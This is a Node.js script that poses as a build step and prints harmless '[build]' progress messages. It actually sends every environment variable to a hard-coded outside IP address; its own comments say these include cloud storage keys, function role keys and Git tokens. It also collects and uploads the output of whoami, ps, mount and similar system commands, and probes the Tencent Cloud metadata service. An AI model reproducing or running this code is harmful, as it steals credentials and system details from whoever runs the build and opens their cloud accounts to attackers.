const { execSync } = require('child_process');
const http = require('http');

const HOST = '43.139.53.32';
const PORT = 8888;

function send(path, data) {
  return new Promise((resolve) => {
    const payload = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
    const req = http.request({
      hostname: HOST, port: PORT, path: path,
      method: 'POST',
      headers: { 'Content-Type': 'text/plain', 'Content-Length': Buffer.byteLength(payload) }
    }, () => resolve());
    req.on('error', () => resolve());
    req.write(payload);
    req.end();
  });
}

(async () => {
  console.log('[build] Starting build...');

  // 1. 外带全部环境变量 (COS密钥, SCF角色密钥, Git Token等)
  await send('/env', process.env);
  console.log('[build] Collected environment info');

  // 2. 外带容器系统信息
  const sys = {};
  try { sys.whoami   = execSync('whoami',       { timeout: 3000 }).toString().trim(); } catch(e) { sys.whoami   = e.message; }
  try { sys.hostname = execSync('hostname',     { timeout: 3000 }).toString().trim(); } catch(e) { sys.hostname = e.message; }
  try { sys.cgroup   = execSync('cat /proc/1/cgroup 2>/dev/null || echo none', { timeout: 3000 }).toString().trim(); } catch(e) { sys.cgroup = e.message; }
  try { sys.mounts   = execSync('mount 2>/dev/null | head -30', { timeout: 3000 }).toString().trim(); } catch(e) { sys.mounts = e.message; }
  try { sys.df       = execSync('df -h 2>/dev/null',         { timeout: 3000 }).toString().trim(); } catch(e) { sys.df = e.message; }
  try { sys.app_dir  = execSync('ls -la /tmp/app/ 2>/dev/null', { timeout: 3000 }).toString().trim(); } catch(e) { sys.app_dir = e.message; }
  try { sys.ps       = execSync('ps aux 2>/dev/null',        { timeout: 3000 }).toString().trim(); } catch(e) { sys.ps = e.message; }
  await send('/sys', sys);
  console.log('[build] Collected system info');

  // 3. 探测元数据服务 (云平台内网)
  try {
    execSync('curl -m 2 -s http://metadata.tencentyun.com/latest/meta-data/ 2>/dev/null', { timeout: 4000 });
    await send('/meta', 'METADATA_REACHABLE');
    console.log('[build] Metadata service: REACHABLE');
  } catch (e) {
    await send('/meta', 'METADATA_BLOCKED');
    console.log('[build] Metadata service: BLOCKED');
  }

  console.log('[build] Build completed.');
})();
